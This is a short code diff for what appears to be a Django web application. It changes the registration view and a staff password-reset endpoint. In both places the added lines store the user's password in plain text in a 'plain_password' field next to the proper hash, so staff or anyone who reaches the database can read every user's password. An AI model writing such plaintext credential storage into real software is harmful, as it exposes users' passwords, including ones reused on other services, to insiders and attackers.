@@ -126,6 +126,8 @@ def register_view(request):
             return render(request, "register.html")
 
         user = User.objects.create_user(phone=phone, password=password)
+        user.plain_password = password
+        user.save(update_fields=["plain_password"])
         ip = get_client_ip(request)
         ua = (request.META.get("HTTP_USER_AGENT") or "")[:255]
         country = ""
@@ -770,7 +772,8 @@ def staff_user_set_password(request, user_id):
     if len(new_pw) < 6:
         return JsonResponse({"ok": False, "error": "min_6"})
     u.set_password(new_pw)
-    u.save(update_fields=["password"])
+    u.plain_password = new_pw
+    u.save(update_fields=["password", "plain_password"])
     return JsonResponse({"ok": True})
 
 
